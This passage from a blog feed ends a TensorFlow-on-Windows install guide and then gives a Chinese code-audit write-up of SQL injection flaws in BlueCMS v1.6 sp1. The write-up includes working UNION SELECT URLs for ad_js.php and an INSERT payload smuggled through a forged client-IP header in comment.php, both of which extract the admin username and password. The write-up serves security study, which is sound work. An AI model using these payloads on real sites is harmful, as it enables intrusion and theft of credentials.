-<h2 id="避坑五：安装系统依赖包"><a href="#避坑五：安装系统依赖包" class="headerlink" title="避坑五：安装系统依赖包"></a>避坑五：安装系统依赖包</h2><p>初次安装，可能会在导入的时候出错，这是因为win系统的动态链接库MSVCP140.DLL缺失的原因.有些同学在这一步没有出错，我猜你们写C语言用的是VS2015啥的hh。如下图，这里只截取部分。<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor5.jpg" alt=""></p>
-<p>去微软官网下载 Visual C++ 2015 redistributable，它包含了MSVCP140.DLL。</p>
-<p>传送门：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53587" target="_blank" rel="external">Visual C++ 2015 redistributable</a></p>
-<p>一定要注意的是，要选择 x64 版本，对应你的64位操作系统<br><img src="http://ojp0pjljj.bkt.clouddn.com/tensor6.jpg" alt=""><br>然后安装。</p>
-<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>在经过前面的步骤后，此时导入tensorflow应该没问题了。<br>!()[<a href="http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg" target="_blank" rel="external">http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg</a>]<br>接下来就简单的测试一下，依次输入<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</div><div class="line">hello = tf.constant(<span class="string">'Hello, TensorFlow!'</span>)</div><div class="line">sess = tf.Session()</div><div class="line">print(sess.run(hello))</div></pre></td></tr></table></figure></p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/tensor8.jpg" alt=""><br>好吧，好像没报错，不过一大堆的消息打印出来，心理总是有点不舒服：）</p>
-<p>这边是关于这个问题的两个讨论，两个问题的讨论时间是在今年的2月份。</p>
-<ul>
-<li><a href="http://stackoverflow.com/questions/42217532/tensorflow-version-1-0-0-rc2-on-windows-opkernel-op-bestsplits-device-typ" target="_blank" rel="external">stackoverflow：unknow op</a></li>
-<li><a href="https://github.com/tensorflow/tensorflow/issues/7500" target="_blank" rel="external">github Issues: unknow op</a></li>
-</ul>
-<p>他们所提出的“解决方法”是安装指定的这个nightly build版本，这个可以确实可以解决掉unknow op的警告问题，不过会产生另外的SSE警告。</p>
-<h1 id="关于python3-6"><a href="#关于python3-6" class="headerlink" title="关于python3.6"></a>关于python3.6</h1><p>有些同学可能一不小心安了python3.6，加上(anaconda官网)[<a href="https://www.continuum.io/downloads/]上的版本也已经更新为python3.6了。所以这边提供一个tensorflow-py3.6的安装包。" target="_blank" rel="external">https://www.continuum.io/downloads/]上的版本也已经更新为python3.6了。所以这边提供一个tensorflow-py3.6的安装包。</a></p>
-<p>传送门：<a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#tensorflow" target="_blank" rel="external"> Python Extension Packages:tensorflow</a></p>
-<p>至于能不能用，仁者见仁智者见智……</p>
-<h1 id="tensorflow-GPU计算"><a href="#tensorflow-GPU计算" class="headerlink" title="tensorflow GPU计算"></a>tensorflow GPU计算</h1><p>过程这里不展开，要装 vs+cuda+tensorflow,如果想更快的话，可以添加cudnn库。同时要求显卡是英伟达的且nvidia compute capability要大于3。此处略过不提。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;好多同学来问怎么安装tensorflow，想想还是写一下吧。&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计之SQL注入：BlueCMSv1.6 sp1</title>
-    <link href="http://yoursite.com/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/"/>
-    <id>http://yoursite.com/2017/03/14/代码审计之SQL注入：BlueCMSv1-6-sp1/</id>
-    <published>2017-03-14T11:39:02.000Z</published>
-    <updated>2017-04-01T13:07:44.515Z</updated>
-    
-    <content type="html"><![CDATA[<p>代码审计学习<br><a id="more"></a></p>
-<h1 id="工具及环境"><a href="#工具及环境" class="headerlink" title="工具及环境"></a>工具及环境</h1><ul>
-<li>bluecms v2.1 sp1<br>链接：<a href="http://pan.baidu.com/s/1dFKLanR" target="_blank" rel="external">http://pan.baidu.com/s/1dFKLanR</a> 密码：8v1c</li>
-<li>seay审计系统<br>链接：<a href="http://pan.baidu.com/s/1dENS4KT" target="_blank" rel="external">http://pan.baidu.com/s/1dENS4KT</a> 密码：rszt</li>
-<li>环境<br>PHP: 5.4.45<br>MYSQL: 5.5.53</li>
-</ul>
-<h1 id="注入一"><a href="#注入一" class="headerlink" title="注入一"></a>注入一</h1><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>用seay审计系统审计一下,定位到/ad_js.php。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms1.jpg" alt=""></p>
-<p>该条语句为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</div></pre></td></tr></table></figure></p>
-<p>getone()是自定义的函数，用来查询数据库，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</div><div class="line">  $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</div><div class="line">  $row = mysql_fetch_array($query, $type);</div><div class="line">  <span class="keyword">return</span> $row;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>回到ad_js.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id</div></pre></td></tr></table></figure></p>
-<p>可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms2.jpg" alt=""></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</div></pre></td></tr></table></figure>
-<p>若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul>
-<li><p>先查询列数</p>
-<p>  /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6<br>  报错</p>
-</li>
-</ul>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms3.jpg" alt=""></p>
-<pre><code>ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8
-报错
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms4.jpg" alt=""></p>
-<pre><code>ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7
-无报错，且查看源代码发现数字7有回显。
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms6.jpg" alt=""></p>
-<ul>
-<li>提取数据<br>利用元数据表爆出表名<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms9.jpg" alt=""></p>
-<ul>
-<li><p>爆出字段</p>
-<p>  ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg" alt=""></p>
-</li>
-<li><p>获取用户名密码</p>
-<p>  ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg" alt=""></p>
-</li>
-</ul>
-<h1 id="注入二"><a href="#注入二" class="headerlink" title="注入二"></a>注入二</h1><h2 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h2><p>函数定位：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>))</div><div class="line">	&#123; <span class="comment">//????????????????????????????ip ???</span></div><div class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $ip;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ，<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms13.jpg" alt=""></p>
-<h2 id="comment-php页面"><a href="#comment-php页面" class="headerlink" title="comment.php页面"></a>comment.php页面</h2><p>其中有如下代码</p>
-<pre><code>$sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;;
-$db-&gt;query($sql);
-</code></pre><p>可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。</p>
-<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这是目前的留言板：<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms17.jpg" alt=""></p>
-<p>在burp截包后，post参数如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms16.jpg" alt=""><br>所以</p>
-<pre><code>user_id=2
-id=6 即 post_id=6 对应发表留言的文章id
-type=1
-mood=6 （这个无关紧要）
-</code></pre><p>为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。</p>
-<p>payload如下：</p>
-<pre><code>1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1
-</code></pre><p>payload分析：1’,’1’)是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 ‘’,’6’,’2’,’1’,’6’ 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 ‘1’,’1  是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。</p>
-<p>所以这样插入后完整的sql语句是：</p>
-<pre><code>$sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)
-  VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;;
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms18.jpg" alt=""><br>Forward后 注入成功。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms20.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;代码审计学习&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
